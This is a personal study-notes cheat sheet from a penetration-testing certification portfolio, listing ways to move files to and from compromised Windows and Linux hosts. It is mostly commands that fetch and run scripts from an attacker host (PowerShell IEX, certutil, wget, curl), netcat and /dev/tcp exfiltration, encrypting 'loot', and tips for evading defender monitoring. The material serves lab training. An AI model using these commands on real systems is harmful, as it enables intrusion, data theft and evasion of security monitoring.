# 07 — File Transfers

> **Path Phase:** Post-Exploitation Utility | **Difficulty:** Medium | **Sections:** 10

Every technique for moving files to/from Windows and Linux targets.

> ℹ️ `<YOUR_IP>` = attacker, `{TARGET}` = target.

---

## Table of Contents
1. File Transfers
2. Windows File Transfer Methods
3. Linux File Transfer Methods
4. Transferring Files with Code
5. Miscellaneous File Transfer Methods
6. Protected File Transfers
7. Catching Files over HTTP/S
8. Living off The Land
9. Detection
10. Evading Detection

---

## 2 — Windows Methods
```powershell
IEX(New-Object Net.WebClient).DownloadString('http://<YOUR_IP>/script.ps1')
(New-Object Net.WebClient).DownloadFile('http://<YOUR_IP>/file.exe','C:\Temp\file.exe')
Invoke-WebRequest -Uri http://<YOUR_IP>/file.exe -OutFile C:\Temp\file.exe
certutil -urlcache -f http://<YOUR_IP>/file.exe file.exe
# Base64:
[IO.File]::WriteAllBytes("C:\Temp\file",[Convert]::FromBase64String("<b64>"))
```

## 3 — Linux Methods
```bash
wget http://<YOUR_IP>/linpeas.sh -O /tmp/linpeas.sh
curl http://<YOUR_IP>/linpeas.sh -o /tmp/linpeas.sh
echo -n '<b64>' | base64 -d > file
scp user@{TARGET}:/path/file .
```

## 4 — Transferring with Code
```bash
python3 -c 'import urllib.request; urllib.request.urlretrieve("http://<YOUR_IP>/f","/tmp/f")'
php -r '$f=file_get_contents("http://<YOUR_IP>/f"); file_put_contents("/tmp/f",$f);'
```

## 5 — Miscellaneous (Netcat / /dev/tcp)
```bash
# Receiver: nc -lvnp 8000 > file
# Sender:   nc <YOUR_IP> 8000 < file
cat < /dev/tcp/<YOUR_IP>/8000 > file
```

## 6 — Protected Transfers (encrypt loot)
```bash
openssl enc -aes256 -iter 100000 -pbkdf2 -in loot.zip -out loot.enc
openssl enc -d -aes256 -iter 100000 -pbkdf2 -in loot.enc -out loot.zip
```

## 7 — Catching Files over HTTP/S
```bash
python3 -m uploadserver     # accepts POST uploads
python3 -m http.server 80
```

## 8 — Living off The Land (LOLBins)
Use built-in signed binaries. Reference: LOLBAS (Windows), GTFOBins (Linux).
```powershell
certutil.exe, bitsadmin.exe, certreq.exe
```

## 9–10 — Detection & Evasion
Defenders monitor `certutil`, `DownloadString`, unusual outbound. Evade: encrypt payloads, less-common LOLBins, custom user-agents, small chunks.
```powershell
Invoke-WebRequest -Uri http://<YOUR_IP>/f -UserAgent "Mozilla/5.0" -OutFile f
```

---

## 🧰 Tools Used
| Platform | Methods |
|----------|---------|
| Windows | PowerShell, certutil, SMB, bitsadmin, base64 |
| Linux | wget, curl, scp, nc, /dev/tcp, python |
| Both | openssl, uploadserver |

## 🔑 Key Takeaways
- Know **at least 3 transfer methods per OS** — one will always be blocked.
- LOLBins avoid dropping detectable tools.
- Encrypt loot before exfiltration.
- `base64` copy-paste works when no network tool is available.

---

*Part of my HTB CPTS Portfolio — Zeshan Ali*
